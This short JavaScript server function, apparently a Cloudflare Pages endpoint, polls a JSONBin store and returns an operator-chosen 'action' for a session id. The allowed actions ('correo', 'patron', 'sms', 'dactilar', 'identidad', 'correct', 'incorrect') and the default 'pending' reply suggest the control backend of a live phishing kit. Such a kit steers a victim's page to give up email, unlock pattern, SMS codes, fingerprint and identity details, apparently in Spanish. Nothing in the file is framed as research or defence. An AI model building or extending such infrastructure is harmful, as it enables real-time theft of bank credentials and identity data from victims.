export async function onRequestGet(context) {
  const { request, env } = context;
  const url = new URL(request.url);
  const sessionId = url.searchParams.get('id');
  if (!sessionId) return new Response(JSON.stringify({ action: 'pending' }), { headers: { 'Content-Type': 'application/json' } });

  const BIN_ID = env.JSONBIN_BIN_ID;
  const API_KEY = env.JSONBIN_API_KEY;
  if (!BIN_ID || !API_KEY) return new Response(JSON.stringify({ action: 'pending' }), { headers: { 'Content-Type': 'application/json' } });

  try {
    const resp = await fetch('https://api.jsonbin.io/v3/b/' + BIN_ID + '/latest', { headers: { 'X-Master-Key': API_KEY } });
    const jsonResp = await resp.json();
    const data = jsonResp.record || {};
    const action = data[sessionId];
    if (!action) return new Response(JSON.stringify({ action: 'pending' }), { headers: { 'Content-Type': 'application/json' } });
    
    const validActions = ['correct', 'incorrect', 'correo', 'patron', 'sms', 'nuevo', 'dactilar', 'identidad'];
    if (validActions.includes(action)) return new Response(JSON.stringify({ action: action }), { headers: { 'Content-Type': 'application/json' } });
    
    return new Response(JSON.stringify({ action: 'pending' }), { headers: { 'Content-Type': 'application/json' } });
  } catch (err) {
    return new Response(JSON.stringify({ action: 'pending' }), { headers: { 'Content-Type': 'application/json' } });
  }
}
